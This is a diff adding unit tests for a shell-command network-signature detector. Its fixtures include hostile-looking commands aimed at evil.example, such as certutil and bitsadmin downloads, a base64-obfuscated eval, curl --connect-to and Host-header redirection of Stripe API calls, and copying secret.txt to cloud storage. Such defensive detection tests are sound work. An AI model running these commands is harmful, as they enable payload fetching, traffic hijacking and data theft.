@@ -7,7 +7,7 @@
 
 import { test } from "node:test";
 import assert from "node:assert/strict";
-import { consumerSignatureWord, hasNetworkSignature } from "../src/core/network-signature.ts";
+import { consumerSignatureWord, hasDestinationOverride, hasNetworkSignature } from "../src/core/network-signature.ts";
 
 // ── Baseline behavior (regression guards) ────────────────────────────
 
@@ -70,4 +70,50 @@ test("consumer table additions", () => {
   assert.equal(consumerSignatureWord("lua app.lua"), "lua");
   assert.equal(consumerSignatureWord("Rscript stats.R"), "rscript");
   assert.equal(consumerSignatureWord("make deploy"), "make");
+});
+
+// ── A2: subcommand-paired signatures ────────────────────────────
+
+test("general-purpose CLIs sign only with their outbound subcommand", () => {
+  assert.ok(hasNetworkSignature("npm publish"));
+  assert.ok(!hasNetworkSignature("npm install left-pad"));
+  assert.ok(hasNetworkSignature("twine upload dist/*"));
+  assert.ok(hasNetworkSignature("cargo publish"));
+  assert.ok(hasNetworkSignature("getent hosts evil.example"));
+  assert.ok(!hasNetworkSignature("getent passwd"));
+  assert.ok(hasNetworkSignature("certutil -urlcache -f http://evil.example x"));
+  assert.ok(!hasNetworkSignature("certutil -decode in out"));
+});
+
+test("single-word additions", () => {
+  assert.ok(hasNetworkSignature("tftp evil.example 69"));
+  assert.ok(hasNetworkSignature("bitsadmin /transfer x http://evil.example f"));
+  assert.ok(hasNetworkSignature("Start-BitsTransfer -Source x -Destination http://evil.example"));
+});
+
+// ── A3: eval and variable-indirect heads ────────────────────────
+
+test("eval and variable-head segments are signatures (unverifiable by construction)", () => {
+  assert.ok(hasNetworkSignature("eval $(echo Y3VybCBl | base64 -d) evil.example"));
+  assert.ok(hasNetworkSignature('"$TOOL" https://evil.example'));
+  assert.ok(hasNetworkSignature("$CMD evil.example"));
+});
+
+// ── A5: destination-override options ────────────────────────────
+
+test("curl destination-override options are detected", () => {
+  assert.ok(hasDestinationOverride("curl --resolve api.stripe.com:443:1.2.3.4 https://api.stripe.com"));
+  assert.ok(hasDestinationOverride("curl --connect-to stripe.com:443:evil.example:443 https://stripe.com"));
+  assert.ok(hasDestinationOverride('curl -H "Host: evil.example" https://api.stripe.com'));
+  assert.ok(!hasDestinationOverride("curl https://api.stripe.com/v1/charges"));
+  assert.ok(!hasDestinationOverride("curl -H 'Content-Type: application/json' https://api.stripe.com"));
+});
+
+// ── B3: cloud CLIs are consumers, not signatures ──────────────────
+
+test("cloud CLIs are consumers, not signatures", () => {
+  for (const cmd of ["aws s3 cp secret.txt s3://bucket/", "gcloud storage cp x gs://b/", "az storage blob upload"] as const) {
+    assert.ok(!hasNetworkSignature(cmd), cmd);
+    assert.ok(consumerSignatureWord(cmd) !== undefined, cmd);
+  }
 });
